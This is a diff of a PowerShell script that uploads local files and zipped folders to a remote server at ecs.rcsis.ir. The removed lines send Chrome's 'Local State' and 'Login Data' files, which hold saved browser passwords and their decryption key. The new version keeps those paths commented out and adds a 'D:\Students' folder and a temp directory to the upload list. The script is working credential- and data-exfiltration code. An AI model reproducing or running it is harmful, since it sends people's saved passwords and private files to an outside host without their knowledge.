@@ -1,46 +1,37 @@
-# Define the URI with the UID parameters
 $uri = "https://ecs.rcsis.ir/upload?uid={uid}"
+# Define the paths to be zipped
 
-# Array of file paths to upload
 $files = @(
-    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
-    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+    "C:\Users\User\AppData\Local\Temp\test",
+    #"$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
+    #("$env:USERPROFILE"+'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
+    'D:\Students'
 )
-
+$webClient = New-Object System.Net.WebClient;
 # Loop through each file path
 foreach ($filePath in $files) {
-    if (Test-Path $filePath -PathType Leaf) {
-        $fileName = [System.IO.Path]::GetFileName($filePath)
-        $fileContent = Get-Content -Path $filePath -Raw
-
-        # Construct the multipart/form-data content
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream",
-            "",
-            $fileContent,
-            "--$boundary--",
-            ""
-        ) -join $LF
-
-        # Set headers and content type
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
-
-        # Send the request
-        $response = Invoke-WebRequest -Uri $uri -Method Post -Body $bodyLines -Headers $headers
-
-        # Check the response status
-        if ($response.StatusCode -eq 200) {
-            Write-Output "File '$fileName' uploaded successfully!"
-        } else {
-            Write-Output "Failed to upload file '$fileName'. Status code: $($response.StatusCode)"
-        }
-    } else {
-        Write-Output "File not found: $filePath"
-    }
+    if (Test-Path $filePath) {
+	$item = Get-Item -Path $filePath
+	if ($item.PSIsContainer) {
+		Write-Output "$filePath is a directory."
+		Add-Type -AssemblyName System.IO.Compression.FileSystem
+		$filename = (Split-Path -Path $filePath -Leaf)
+		$Destination = "$env:USERPROFILE\AppData\Local\Temp\" + $filename + ".zip"
+		[System.IO.Compression.ZipFile]::CreateFromDirectory($filePath , $Destination)
+		$response = $webClient.UploadFile($uri,$Destination)
+		$res = ([System.Text.Encoding]::ASCII.GetString($response) | ConvertFrom-Json)
+		Write-OutPut $res.message ""
+		#rm $Destination
+	}
+	else{	
+		Write-Output "$filePath is a file."
+		$response = $webClient.UploadFile($uri,$filePath)
+       		$res = ([System.Text.Encoding]::ASCII.GetString($response) | ConvertFrom-Json)
+		Write-OutPut $res ""	
+       	}
+	}
+	else{
+		Write-OutPut "The Path $filepath Not Found "
+	}
 }
+
